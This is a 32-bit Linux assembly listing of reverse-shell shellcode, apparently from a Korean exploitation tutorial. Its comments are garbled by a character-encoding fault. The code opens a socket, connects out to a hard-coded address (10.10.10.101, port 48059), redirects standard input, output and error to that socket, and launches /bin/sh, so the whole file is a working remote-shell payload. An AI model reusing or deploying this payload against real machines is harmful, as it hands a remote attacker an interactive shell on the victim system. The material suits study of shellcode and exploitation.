BITS 32
section .text
global _start
_start:
xor eax,eax	; eax Ŭ����
xor ebx,ebx	; ebx Ŭ����
xor edx,edx	; edx Ŭ����

;socket(2,1,0)
push	eax	; socket�� ���� �� ��° �μ�: 0
push	byte 0x1; socket�� ���� �� ��° �μ�: 1
push	byte 0x2; socket�� ���� ù ��° �μ�: 2
mov	ecx,esp	; �μ��� ���� �����͸� ecx�� �̵�(socketcall�� ���� �� ��° �μ�)
inc	bl	; socketcall�� ù ��° �μ��� # 1�� ����
mov	al,102	; socketcall # 1 ȣ��: SYS_SOCKET
int	0x80	; Ŀ�� ���� ����, syscall ȣ��
mov	esi,eax	; ��ȯ��(eax)�� esi�� ����

; ���� ����� bind, listen, accept ȣ���� connect�� ��ü��
;client=connect(server,(struct sockaddr *)&serv_addr,0x10)
push	edx		; ���� 0��, Ǫ�õ� ���� �� �ʱ�ȭ�ϴ� �� ���
push	long 0x650A0A0A	; �߰��� ����, �Ųٷ� �� 16������ �ּҸ� Ǫ��
push	word 0xBBBB	; ���ÿ� ��Ʈ Ǫ��, �������δ� 48059
xor	ecx, ecx	; sa_family �ʵ带 ������ ecx �ʱ�ȭ
mov	cl,2		; �ϳ��� ����Ʈ:2�� ecx�� ���� ���� ����Ʈ�� �̵�
push	word cx ;	; ����ü ����, ��Ʈ ���, sin.family:0002 4 bytes
mov	ecx,esp		; ���ÿ� �ִ� addr ����ü�� ecx�� �̵�
push	byte  0x10	; connect �μ� ����, 16 ���� Ǫ��
push	ecx		; ������ ����ü �ּҸ� ����
push	esi		; ���� ���� �����(esi)�� ���ÿ� ����
mov	ecx,esp		; �μ��� �����͸� ecx�� ����(socketcall�� �� ��° �μ�)
mov	bl,3		; bl�� # 3���� ����, socketcall�� ù ��° �μ�
mov	al,102		; socketcall # 3 ȣ��: SYS_CONNECT
int	0x80		; Ŀ�� ���� ����, syscall ȣ��

; dup2 ��� �غ�, ebx�� ����� Ŭ���̾�Ʈ ���� �ڵ��� �ʿ���
mov	ebx,esi	; ��ȯ�� Ŭ���̾�Ʈ�� soc ���� ����ڸ� ebx�� ����

;dup2(soc, 0)
xor	ecx,ecx	; ecx �ʱ�ȭ
mov	al,63	; syscall�� ù ��° �μ��� 0x63�� ����: dup2
int	0x80	; ����

;dup2(soc, 1)
inc	ecx	; ecx�� 1�� ����
mov	al,63	; dup2:63�� ���� syscall �غ�
int	0x80	; ����

;dup2(soc, 2)
inc	ecx	; ecx�� 2�� ����
mov	al,63	; dup2:63�� ���� syscall �غ�
int	0x80	; ����

;standard execve("/bin/sh"...
push edx
push long 0x68732f2f
push long 0x6e69622f
mov  ebx,esp
push edx
push ebx
mov  ecx,esp
mov  al, 0x0b
int 0x80
